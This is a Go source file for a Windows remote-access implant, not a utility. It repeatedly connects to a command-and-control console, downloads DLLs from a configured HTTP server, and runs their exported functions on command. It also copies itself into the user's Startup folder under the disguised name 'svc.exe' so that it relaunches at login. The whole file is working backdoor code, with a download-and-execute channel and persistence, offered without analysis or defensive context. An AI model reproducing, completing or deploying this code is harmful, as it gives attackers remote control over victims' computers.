package main

// #include <stdlib.h>
import "C"

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"syscall"
	"unsafe"
	"time"
)

var (
	consoleAddr = "localhost:5000"
	httpServer  = "http://localhost:80"
)

var dllHandle syscall.Handle

func cleanup(handle syscall.Handle) {
	time.Sleep(2 * time.Second)
	if handle != 0 {
		syscall.FreeLibrary(handle)
		dllHandle = 0
	}
}

func downloadDLL(dll string) error {
	resp, err := http.Get(httpServer + "/downloads/" + dll)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	f, err := os.Create(dll)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = io.Copy(f, resp.Body)
	return err
}

// Safely call exported DLL function
func callDLL(dllPath, funcName, arg1, arg2 string) (string, error) {
	dll, err := syscall.LoadLibrary(dllPath)
	if err != nil {
		return "", fmt.Errorf("load failed: %v", err)
	}
	dllHandle = dll

	proc, err := syscall.GetProcAddress(dll, funcName)
	if err != nil {
		return "", fmt.Errorf("proc not found: %v", err)
	}

	cArg1 := append([]byte(arg1), 0)
	cArg2 := append([]byte(arg2), 0)
	r1, _, _ := syscall.Syscall(proc, 2,
		uintptr(unsafe.Pointer(&cArg1[0])),
		uintptr(unsafe.Pointer(&cArg2[0])),
		0)
	if r1 == 0 {
		return "", fmt.Errorf("null pointer result")
	}
	result := C.GoString((*C.char)(unsafe.Pointer(r1)))
        defer C.free(unsafe.Pointer(r1))
	return result, nil
}

// Add persistence by copying itself to startup
func persistent() string {
	exe, err := os.Executable()
	if err != nil {
		return "get exe failed: " + err.Error()
	}
	startup := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe"
	data, err := os.ReadFile(exe)
	if err != nil {
		return "read self failed: " + err.Error()
	}
	if err := os.WriteFile(startup, data, 0755); err != nil {
		return "write failed: " + err.Error()
	}
	return "Persistence added."
}

// Remove persistence by deleting startup copy
func unpersistent() string {
	startup := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe"
	if err := os.Remove(startup); err != nil {
		return "delete failed: " + err.Error()
	}
	return "Persistence removed."
}

func handle(conn net.Conn) {
	defer conn.Close()
	for {
		buf := make([]byte, 1 << 24)
		n, err := conn.Read(buf)
		go cleanup(dllHandle)
		if err != nil {
			return
		}
		cmd := strings.TrimSpace(string(buf[:n]))
		if cmd == "" {
			continue
		}

		parts := strings.SplitN(cmd, " ", 3)
		if len(parts) < 3 {
			conn.Write([]byte("Usage: dll/function arg1 arg2\n"))
			continue
		}

		dllFunc := parts[0]
		args := parts[1:]
		split := strings.Split(dllFunc, "/")
		if len(split) != 2 {
			conn.Write([]byte("Invalid format: use dll/function\n"))
			continue
		}

		dllFile, fn := split[0], split[1]

		// Internal static commands
		if dllFile == "static" {
			var output string
			switch fn {
			case "persistent":
				output = persistent()
			case "unpersistent":
				output = unpersistent()
			default:
				output = "Unknown static function"
			}
			conn.Write([]byte(output + "\n"))
			continue
		}

		// External DLL command
		if _, err := os.Stat(dllFile); os.IsNotExist(err) {
			if err := downloadDLL(dllFile); err != nil {
				conn.Write([]byte("Download failed: " + err.Error() + "\n"))
				continue
			}
		}
		
		result, err := callDLL(dllFile, fn, args[0], args[1])

		if err != nil {
			conn.Write([]byte(err.Error() + "\n"))
			continue
		}

		conn.Write([]byte("." + result + "\n"))
	}
}

func main() {
	for {
		conn, err := net.Dial("tcp", consoleAddr)
		if err != nil {
			continue
		}
		handle(conn)
	}
}


